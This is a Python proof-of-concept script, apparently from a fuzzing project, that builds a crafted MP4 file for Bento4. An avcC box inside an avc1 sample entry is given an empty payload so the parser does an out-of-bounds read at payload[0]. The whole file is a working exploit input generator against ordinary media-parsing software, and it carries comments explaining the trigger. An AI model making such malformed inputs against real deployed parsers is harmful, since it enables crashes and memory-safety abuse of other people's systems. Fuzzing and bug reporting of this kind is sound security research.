#!/usr/bin/env python3
import struct
import os

poc_dir = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AvccAtom_cpp"
output_file = os.path.join(poc_dir, "vuln_001.mp4")

def make_box(box_type, data=b''):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I4s', size, box_type) + data

def make_fullbox(box_type, version=0, flags=0, data=b''):
    return make_box(box_type, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# ftyp
ftyp = make_box('ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

# avcC - CRAFTED: size=8, no payload → payload_size=0 → OOB read at payload[0]
avcc = make_box('avcC', b'')  # size=8, empty payload

# avc1 visual sample entry (70 bytes base)
identity_matrix = struct.pack('>IIIIIIIII',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

avc1_data = (
    b'\x00' * 6 +                         # reserved
    struct.pack('>H', 1) +                 # data_reference_index
    b'\x00' * 2 +                         # pre_defined
    b'\x00' * 2 +                         # reserved
    b'\x00' * 12 +                        # pre_defined[3]
    struct.pack('>HH', 320, 240) +        # width, height
    struct.pack('>II', 0x00480000, 0x00480000) +  # horizres, vertres
    b'\x00' * 4 +                         # reserved
    struct.pack('>H', 1) +                 # frame_count
    b'\x00' * 32 +                        # compressorname
    struct.pack('>H', 0x0018) +           # depth = 24
    struct.pack('>H', 0xFFFF) +           # pre_defined = -1
    avcc                                   # child avcC box
)
avc1 = make_box('avc1', avc1_data)

# stsd
stsd = make_fullbox('stsd', 0, 0, struct.pack('>I', 1) + avc1)

# stts, stsc, stsz, stco (all empty)
stts = make_fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc = make_fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = make_fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = make_fullbox('stco', 0, 0, struct.pack('>I', 0))

# stbl
stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

# vmhd (video media header, flags=1 required)
vmhd = make_fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)

# url (self-contained data reference, flags=1)
url = make_fullbox('url ', 0, 1, b'')

# dref
dref = make_fullbox('dref', 0, 0, struct.pack('>I', 1) + url)

# dinf
dinf = make_box('dinf', dref)

# minf
minf = make_box('minf', vmhd + dinf + stbl)

# mdhd (language 'und' = 0x55C4)
mdhd = make_fullbox('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) +
    struct.pack('>HH', 0x55C4, 0))

# hdlr
hdlr = make_fullbox('hdlr', 0, 0,
    struct.pack('>I', 0) +   # pre_defined
    b'vide' +                  # handler_type
    b'\x00' * 12 +             # reserved[3]
    b'Video\x00')              # name

# mdia
mdia = make_box('mdia', mdhd + hdlr + minf)

# tkhd (flags=3: enabled + in movie)
tkhd = make_fullbox('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +  # ct, mt, track_id, reserved, duration
    b'\x00' * 8 +                              # reserved[2]
    struct.pack('>HHHH', 0, 0, 0x0100, 0) +   # layer, alt_group, volume, reserved
    identity_matrix +
    struct.pack('>II', 320 << 16, 240 << 16))  # width, height (16.16)

# trak
trak = make_box('trak', tkhd + mdia)

# mvhd (version 0)
mvhd = make_fullbox('mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000) +  # ct, mt, ts, dur, rate
    struct.pack('>H', 0x0100) +   # volume
    b'\x00' * 10 +                 # reserved
    identity_matrix +
    b'\x00' * 24 +                 # pre_defined[6]
    struct.pack('>I', 2))          # next_track_id

# moov
moov = make_box('moov', mvhd + trak)

# Write MP4
mp4_data = ftyp + moov
with open(output_file, 'wb') as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {output_file}")
print(f"  avcC box size=8, payload_size=0 → OOB read at payload[0]")
